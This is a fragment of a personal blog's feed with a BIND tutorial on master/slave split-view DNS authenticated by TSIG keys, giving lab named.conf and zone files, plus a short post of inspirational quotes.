</span><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@controller</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># rndc -s 192.168.10.112 dumpdb</span>
</span><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@controller</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># rndc -s 192.168.10.111 dumpdb</span>
</span><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@controller</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># rndc -s 192.168.10.112 stop</span>
</span><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@controller</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># rndc -s 192.168.10.111 stop</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Notice</h2>

<h3>Time is so strict</h3>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ntpdate time.windows.com
</span></code></pre></td></tr></table></div></figure>


<h3>there is a nice thing. Find it.</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@master etc]# ls
</span><span class='line'>...... rndc.key
</span><span class='line'>[root@master etc]# service named stop                ///The rndc.key file disappear.
</span><span class='line'>[root@master etc]# ls
</span><span class='line'>......  //no rndc.key file
</span><span class='line'>[root@master etc]# service named start
</span><span class='line'>[root@master etc]# ls
</span><span class='line'>...... rndc.key</span></code></pre></td></tr></table></div></figure>


<h2>Reference:</h2>

<p><a href="http://www.amazon.com/DNS-BIND-5th-Cricket-Liu/dp/0596100574">OReilly DNS and BIND, 5th Edition.</a><br />
Do you need it? It&#8217;s so nice. Call me. <strong><em>linuxtaolinran@gmail.com</em></strong> <br />
<a href="http://ftp.isc.org/isc/bind9/cur/9.9/doc/arm/Bv9ARM.pdf">BIND 9 Administrator Reference Manual</a></p>

<h3>more&#8230;&#8230;</h3>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[happy 51]]></title>
    <link href="http://lin-credible.github.io/blog/2013/05/01/happy-51/"/>
    <updated>2013-05-01T15:35:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/05/01/happy-51</id>
    <content type="html"><![CDATA[<p>The world is a book and those who do not travel read only one page!<br />
<img src="http://lin-credible.github.io/images/sea.jpg" alt="alt text" /><br />
Life is the sum of all your choices.<br /></p>

<!-- more -->


<p><img src="http://lin-credible.github.io/images/you.jpg" alt="alt text" /><br />
One of the best feelings in the world is when you&#8217;re hugging the person you love, and they hug you back even tighter.<br />
I apply to get into your life, now. <br />
<img src="http://lin-credible.github.io/images/nice.jpg" alt="alt text" /><br />
The clock is running. Make the most of today. Time waits for no man. Yesterday is history. Tomorrow is a mystery. <strong><em>Today</em></strong> is a gift. That&#8217;s why it is called the present.<br /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[M/S Split DNS Based on TSIG]]></title>
    <link href="http://lin-credible.github.io/blog/2013/04/25/master-slash-slave-dns-server-base-on-tsig/"/>
    <updated>2013-04-25T09:08:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/04/25/master-slash-slave-dns-server-base-on-tsig</id>
    <content type="html"><![CDATA[<pre><code>TSIG
</code></pre>

<p>  <strong>TSIG</strong> provides authentication and data integrity through the use of a special type of mathematical formula called a one-way hash function. A
one-way hash function, also known as a cryptographic checksum or message digest, computes a fixed-size hash value based on arbitrarily large input.
The magic of a one-way hash function is that each bit of the hash value depends on each and every bit of the input. Change a single bit of the input,
and the hash value changes dramatically and unpredictablyso unpredictably that it&#8217;s &#8220;computationally infeasible&#8221; to reverse the function and find an
input that produces a given hash value.<br />
  <strong>TSIG</strong> uses a one-way hash function called MD5. In particular, it uses a variant of MD5 called HMAC-MD5. HMAC-MD5 works in a keyed mode in which
the 128-bit hash value depends not only on the input, but also on a key.</p>

<pre><code>Running a Primary Nameserver
</code></pre>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> yum -y install <span class="nb">bind bind</span>-chroot <span class="nb">bind</span>-devel <span class="nb">bind</span>-libs <span class="nb">bind</span>-utils
</span></code></pre></td></tr></table></div></figure>


<p>   <strong>&#8230;</strong></p>

<!-- more -->


<pre><code>Running a Slave Nameserver
</code></pre>

<p>  You need to set up another nameserver for robustness. You can (and probably will eventually) set up <strong><em>more than two authoritative nameservers</em></strong>
for your zones. Two nameservers are the minimum; if you have only one nameserver, and it goes down, no one can look up domain names. A second
nameserver splits the load with the first server or handles the whole load if the first server is down. You could set up another primary
nameserver, but we don&#8217;t recommend it. Instead, set up a slave nameserver. You can always change a slave nameserver to a primary nameserver if
you decide to expend the extra effort it takes to run multiple primary nameservers.<br />
  How does a server know if it&#8217;s the primary or a slave for a zone? The named.conf file tells the nameserver whether it is the primary or a slave
on a per-zone basis. The NS records don&#8217;t tell us which server is the primary for a zone and which servers are slaves; they only say who the
servers are. (Globally, DNS doesn&#8217;t care; as far as the actual name resolution goes, slave servers are as good as primary servers.)
What&#8217;s the difference between a primary nameserver and a slave nameserver? The crucial difference is where the server gets its data. A primary
nameserver reads its data from zone datafiles. A slave nameserver loads its data over the network from another nameserver. This process is called a
<strong><em>zone transfer</em></strong>.<br />
  A slave nameserver is not limited to loading zones from a primary nameserver; it can also load from another slave server.
The big advantage of slave nameservers is that you maintain only one set of zone datafiles for a zone, the ones on the primary nameserver. You
don&#8217;t have to worry about synchronizing the files among nameservers; the slaves do that for you. The caveat is that a slave does not resynchronize
instantly: it polls to see if its zone data is current. The polling interval is one of those numbers in the SOA record that we haven&#8217;t explained yet.
(BIND versions 8 and 9 support mechanisms to speed up the distribution of zone data, which we&#8217;ll describe later.)</p>

<pre><code>Views
</code></pre>

<p>  BIND 9 introduced views, another mechanism that&#8217;s very useful in firewalled environments. Views allow you to present one nameserver configuration
to one community of hosts and a different configuration to another community. This is particularly handy if you&#8217;re running a nameserver on a host
that receives queries from both your internal hosts and hosts on the Internet</p>

<pre><code>My test!
</code></pre>

<h3>structure.</h3>

<p><img src="http://lin-credible.github.io/images/structure_dns.jpg" alt="alt text" /><br />
&#8220;&#8230;&#8230;&#8221; for Extensions.</p>

<h3>Important steps and files.</h3>

<h4>TSIG</h4>

<figure class='code'><figcaption><span>TSIG - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@master</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># pwd</span>
</span><span class='line'> <span class="sr">/var/n</span><span class="n">amed</span><span class="o">/</span><span class="n">chroot</span><span class="o">/</span><span class="n">etc</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@master</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># dnssec-keygen -a HMAC-MD5 -b 128 -n HOST lan192</span>
</span><span class='line'> <span class="no">Klan192</span><span class="o">.</span><span class="n">+</span><span class="mi">157</span><span class="o">+</span><span class="mi">60759</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@master</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># dnssec-keygen -a HMAC-MD5 -b 128 -n HOST lan10</span>
</span><span class='line'> <span class="no">Klan10</span><span class="o">.</span><span class="n">+</span><span class="mi">157</span><span class="o">+</span><span class="mi">57014</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@master</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># ls -lt</span>
</span><span class='line'> <span class="o">.</span><span class="n">.</span><span class="o">.</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">named</span>   <span class="mi">165</span> <span class="no">Apr</span> <span class="mi">24</span> <span class="mi">19</span><span class="p">:</span><span class="mi">54</span> <span class="no">Klan10</span><span class="o">.</span><span class="n">+</span><span class="mi">157</span><span class="o">+</span><span class="mi">57014</span><span class="o">.</span><span class="n">private</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">named</span>   <span class="mi">165</span> <span class="no">Apr</span> <span class="mi">24</span> <span class="mi">19</span><span class="p">:</span><span class="mi">53</span> <span class="no">Klan192</span><span class="o">.</span><span class="n">+</span><span class="mi">157</span><span class="o">+</span><span class="mi">60759</span><span class="o">.</span><span class="n">private</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">named</span>    <span class="mi">49</span> <span class="no">Apr</span> <span class="mi">24</span> <span class="mi">19</span><span class="p">:</span><span class="mi">50</span> <span class="no">Klan10</span><span class="o">.</span><span class="n">+</span><span class="mi">157</span><span class="o">+</span><span class="mi">57014</span><span class="o">.</span><span class="n">key</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">named</span>    <span class="mi">50</span> <span class="no">Apr</span> <span class="mi">24</span> <span class="mi">19</span><span class="p">:</span><span class="mi">46</span> <span class="no">Klan192</span><span class="o">.</span><span class="n">+</span><span class="mi">157</span><span class="o">+</span><span class="mi">60759</span><span class="o">.</span><span class="n">key</span>
</span><span class='line'> <span class="o">.</span><span class="n">.</span><span class="o">.</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@master</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># cat Klan192.+157+60759.private </span>
</span><span class='line'> <span class="no">Private</span><span class="o">-</span><span class="n">key</span><span class="o">-</span><span class="nb">format</span><span class="p">:</span> <span class="n">v1</span><span class="o">.</span><span class="mi">3</span>
</span><span class='line'> <span class="ss">Algorithm</span><span class="p">:</span> <span class="mi">157</span> <span class="p">(</span><span class="no">HMAC_MD5</span><span class="p">)</span>
</span><span class='line'> <span class="ss">Key</span><span class="p">:</span> <span class="no">RQXeMPEXAj5Mx37pzJ044A</span><span class="o">==</span>   <span class="sr">//</span><span class="no">Notice</span> <span class="o">&lt;</span><span class="mi">1</span><span class="o">&gt;.</span>
</span><span class='line'> <span class="ss">Bits</span><span class="p">:</span> <span class="no">AAA</span><span class="o">=</span>
</span><span class='line'> <span class="ss">Created</span><span class="p">:</span> <span class="mi">20130424114602</span>
</span><span class='line'> <span class="ss">Publish</span><span class="p">:</span> <span class="mi">20130424114602</span>
</span><span class='line'> <span class="ss">Activate</span><span class="p">:</span> <span class="mi">20130424114602</span>
</span></code></pre></td></tr></table></div></figure>


<h4>master named.conf</h4>

<figure class='code'><figcaption><span>(master)192.168.10.112/named.conf - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="n">acl</span> <span class="n">zone1</span> <span class="p">{</span>
</span><span class='line'> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">78</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">acl</span> <span class="n">zone2</span> <span class="p">{</span>
</span><span class='line'> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">key</span> <span class="n">lan192</span> <span class="p">{</span>
</span><span class='line'>         <span class="n">algorithm</span> <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span><span class="p">;</span>
</span><span class='line'>         <span class="n">secret</span> <span class="s2">&quot;RQXeMPEXAj5Mx37pzJ044A==&quot;</span><span class="p">;</span>         <span class="sr">//</span><span class="no">Notice</span> <span class="o">&lt;</span><span class="mi">1</span><span class="o">&gt;.</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">key</span> <span class="n">lan10</span> <span class="p">{</span>
</span><span class='line'>         <span class="n">algorithm</span> <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span><span class="p">;</span>
</span><span class='line'>         <span class="n">secret</span> <span class="s2">&quot;TUklzhkwYd6roL7tO4BE5Q==&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">options</span>
</span><span class='line'> <span class="p">{</span>
</span><span class='line'>   <span class="n">listen</span><span class="o">-</span><span class="n">on</span> <span class="n">port</span> <span class="mi">53</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>   <span class="n">directory</span> <span class="s2">&quot;/var/named&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="n">dump</span><span class="o">-</span><span class="n">file</span> <span class="s2">&quot;/var/named/data/cache_dump.db&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="n">statistics</span><span class="o">-</span><span class="n">file</span> <span class="s2">&quot;/var/named/data/named_stats.txt&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="n">memstatistics</span><span class="o">-</span><span class="n">file</span> <span class="s2">&quot;/var/named/data/named_mem_stats.txt&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="n">query</span><span class="o">-</span><span class="n">source</span> <span class="n">port</span> <span class="mi">53</span><span class="p">;</span>
</span><span class='line'>   <span class="n">query</span><span class="o">-</span><span class="n">source</span><span class="o">-</span><span class="n">v6</span> <span class="n">port</span> <span class="mi">53</span><span class="p">;</span>
</span><span class='line'>   <span class="n">allow</span><span class="o">-</span><span class="n">query</span> <span class="p">{</span> <span class="n">any</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>   <span class="n">allow</span><span class="o">-</span><span class="n">recursion</span> <span class="p">{</span> <span class="n">any</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>   <span class="n">version</span> <span class="s2">&quot;None of your business&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="n">notify</span> <span class="n">yes</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">view</span> <span class="s2">&quot;lan192&quot;</span> <span class="p">{</span>
</span><span class='line'>         <span class="n">match</span><span class="o">-</span><span class="n">clients</span> <span class="p">{</span> <span class="n">key</span> <span class="n">lan192</span><span class="p">;</span><span class="n">zone1</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>         <span class="n">server</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="p">{</span> <span class="n">keys</span><span class="p">{</span><span class="n">lan192</span><span class="p">;};</span> <span class="p">};</span>
</span><span class='line'>         <span class="n">zone</span> <span class="s2">&quot;test.cn&quot;</span> <span class="no">IN</span> <span class="p">{</span>
</span><span class='line'>                         <span class="n">type</span> <span class="n">master</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">file</span> <span class="s2">&quot;test.cn.lan192&quot;</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">allow</span><span class="o">-</span><span class="n">transfer</span> <span class="p">{</span> <span class="n">key</span> <span class="n">lan192</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                         <span class="n">also</span><span class="o">-</span><span class="n">notify</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                 <span class="p">};</span>
</span><span class='line'>         <span class="n">zone</span> <span class="s2">&quot;10.168.192.in-addr.arpa&quot;</span> <span class="no">IN</span> <span class="p">{</span>
</span><span class='line'>                         <span class="n">type</span> <span class="n">master</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">file</span> <span class="s2">&quot;192.168.10.zone&quot;</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">allow</span><span class="o">-</span><span class="n">transfer</span> <span class="p">{</span> <span class="n">key</span> <span class="n">lan192</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                         <span class="n">also</span><span class="o">-</span><span class="n">notify</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                 <span class="p">};</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">view</span> <span class="s2">&quot;lan10&quot;</span> <span class="p">{</span>
</span><span class='line'>         <span class="n">match</span><span class="o">-</span><span class="n">clients</span> <span class="p">{</span> <span class="n">key</span> <span class="n">lan10</span><span class="p">;</span><span class="n">zone2</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>         <span class="n">server</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="p">{</span> <span class="n">keys</span><span class="p">{</span><span class="n">lan10</span><span class="p">;};</span> <span class="p">};</span>
</span><span class='line'>         <span class="n">zone</span> <span class="s2">&quot;test.cn&quot;</span> <span class="no">IN</span> <span class="p">{</span>
</span><span class='line'>                         <span class="n">type</span> <span class="n">master</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">file</span> <span class="s2">&quot;test.cn.lan10&quot;</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">allow</span><span class="o">-</span><span class="n">transfer</span> <span class="p">{</span> <span class="n">key</span> <span class="n">lan10</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                         <span class="n">also</span><span class="o">-</span><span class="n">notify</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                 <span class="p">};</span>
</span><span class='line'>         <span class="n">zone</span> <span class="s2">&quot;10.10.10.in-addr.arpa&quot;</span> <span class="no">IN</span> <span class="p">{</span>
</span><span class='line'>                         <span class="n">type</span> <span class="n">master</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">file</span> <span class="s2">&quot;10.10.10.zone&quot;</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">allow</span><span class="o">-</span><span class="n">transfer</span> <span class="p">{</span> <span class="n">key</span> <span class="n">lan10</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                         <span class="n">also</span><span class="o">-</span><span class="n">notify</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                 <span class="p">};</span>
</span><span class='line'> <span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<h4>master zone files.</h4>

<h5>test.cn.lan192</h5>

<figure class='code'><figcaption><span>test.cn.lan192 - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="vg">$TTL</span> <span class="mi">86400</span>
</span><span class='line'> <span class="err">@</span>       <span class="no">IN</span> <span class="no">SOA</span>  <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span> <span class="p">(</span>
</span><span class='line'>                                         <span class="mi">20130424</span>        <span class="p">;</span> <span class="n">serial</span>
</span><span class='line'>                                         <span class="mi">3</span><span class="n">H</span>      <span class="p">;</span> <span class="n">refresh</span>
</span><span class='line'>                                         <span class="mi">15</span><span class="n">M</span>     <span class="p">;</span> <span class="k">retry</span>
</span><span class='line'>                                         <span class="mi">1</span><span class="n">W</span>      <span class="p">;</span> <span class="n">expire</span>
</span><span class='line'>                                         <span class="mi">1</span><span class="n">D</span> <span class="p">)</span>    <span class="p">;</span> <span class="n">minimum</span>
</span><span class='line'> <span class="err">@</span>                                       <span class="no">IN</span> <span class="no">NS</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'>                                         <span class="no">IN</span> <span class="no">MX</span> <span class="mi">10</span> <span class="n">mail</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'> <span class="n">taolr</span>         <span class="no">IN</span> <span class="n">A</span>     <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'> <span class="n">bbs</span>           <span class="no">IN</span> <span class="n">A</span>     <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'> <span class="n">mail</span>          <span class="no">IN</span> <span class="n">A</span>     <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'> <span class="n">wordpress</span>     <span class="no">IN</span> <span class="n">A</span>     <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'> <span class="n">ftp</span>           <span class="no">IN</span> <span class="no">CNAME</span>    <span class="n">bbs</span>
</span></code></pre></td></tr></table></div></figure>


<h5>test.cn.lan10</h5>

<figure class='code'><figcaption><span>test.cn.lan10 - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="vg">$TTL</span> <span class="mi">86400</span>
</span><span class='line'> <span class="err">@</span>       <span class="no">IN</span> <span class="no">SOA</span>  <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span> <span class="p">(</span>
</span><span class='line'>                                         <span class="mi">20130425</span>        <span class="p">;</span> <span class="n">serial</span>
</span><span class='line'>                                         <span class="mi">3</span><span class="n">H</span>      <span class="p">;</span> <span class="n">refresh</span>
</span><span class='line'>                                         <span class="mi">15</span><span class="n">M</span>     <span class="p">;</span> <span class="k">retry</span>
</span><span class='line'>                                         <span class="mi">1</span><span class="n">W</span>      <span class="p">;</span> <span class="n">expire</span>
</span><span class='line'>                                         <span class="mi">1</span><span class="n">D</span> <span class="p">)</span>    <span class="p">;</span> <span class="n">minimum</span>
</span><span class='line'> <span class="err">@</span>                                       <span class="no">IN</span> <span class="no">NS</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'>                                         <span class="no">IN</span> <span class="no">MX</span> <span class="mi">10</span> <span class="n">mail</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'> <span class="n">taolr</span>           <span class="no">IN</span> <span class="n">A</span>       <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'> <span class="n">bbs</span>             <span class="no">IN</span> <span class="n">A</span>       <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'> <span class="n">mail</span>            <span class="no">IN</span> <span class="n">A</span>       <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'> <span class="n">wordpress</span>       <span class="no">IN</span> <span class="n">A</span>       <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'> <span class="n">ftp</span>             <span class="no">IN</span> <span class="no">CNAME</span>  <span class="n">bbs</span>
</span></code></pre></td></tr></table></div></figure>


<h5>192.168.10.zone</h5>

<figure class='code'><figcaption><span>192.168.10.zone - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="vg">$TTL</span> <span class="mi">86400</span>
</span><span class='line'> <span class="err">@</span>       <span class="no">IN</span> <span class="no">SOA</span>  <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span> <span class="p">(</span>
</span><span class='line'>                                         <span class="mi">20130424</span>        <span class="p">;</span> <span class="n">serial</span>
</span><span class='line'>                                         <span class="mi">3</span><span class="n">H</span>      <span class="p">;</span> <span class="n">refresh</span>
</span><span class='line'>                                         <span class="mi">15</span><span class="n">M</span>     <span class="p">;</span> <span class="k">retry</span>
</span><span class='line'>                                         <span class="mi">1</span><span class="n">W</span>      <span class="p">;</span> <span class="n">expire</span>
</span><span class='line'>                                         <span class="mi">1</span><span class="n">D</span> <span class="p">)</span>    <span class="p">;</span> <span class="n">minimum</span>
</span><span class='line'> <span class="err">@</span>                                       <span class="no">IN</span> <span class="no">NS</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'>                                         <span class="no">IN</span> <span class="no">MX</span> <span class="mi">11</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
